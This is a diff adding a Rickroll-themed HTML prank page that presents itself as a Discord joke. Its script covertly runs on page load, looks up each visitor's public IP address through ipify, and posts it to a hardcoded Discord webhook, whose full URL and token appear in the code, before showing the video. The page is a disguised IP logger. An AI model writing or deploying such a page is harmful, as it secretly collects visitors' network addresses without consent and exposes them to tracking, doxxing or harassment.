@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>erm okay</title>
+</head>
+<body>
+    <h1>Rick rolled discord LOL</h1>
+    <div id="ipAddress">Loading... discord mod loaded</div>
+
+    <h2>Never Gonna Give You Up</h2>
+    <div id="videoContainer">
+        <!-- YouTube Video Embedded Here -->
+    </div>
+
+    <script>
+        fetch('https://api.ipify.org/?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ipAddress = data.ip;
+                
+                const webhookUrl = 'https://discord.com/api/webhooks/1236102453213007915/miB369NZpAGwoI0szpC_GNWg_UlmCtWomsSXschtR1SaOaauk1Ikl3QhhAYSv-jdiVVr';
+                const payload = {
+                    content: `New IP address: ${ipAddress}`
+                };
+                
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                })
+                .then(response => console.log('Webhook sent:', response))
+                .catch(error => console.error('Error sending webhook:', error));
+
+                // Embedding YouTube video
+                const videoContainer = document.getElementById('videoContainer');
+                const iframe = document.createElement('iframe');
+                iframe.setAttribute('width', '560');
+                iframe.setAttribute('height', '315');
+                iframe.setAttribute('src', 'https://www.youtube.com/watch?v=dQw4w9WgXcQ');
+                iframe.setAttribute('frameborder', '0');
+                iframe.setAttribute('allow', 'accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture');
+                iframe.setAttribute('allowfullscreen', '');
+                videoContainer.appendChild(iframe);
+            })
+            .catch(error => {
+                console.error('Error fetching IP address:', error);
+                document.getElementById('ipAddress').innerText = 'Error fetching IP address';
+            });
+    </script>
+</body>
+</html>
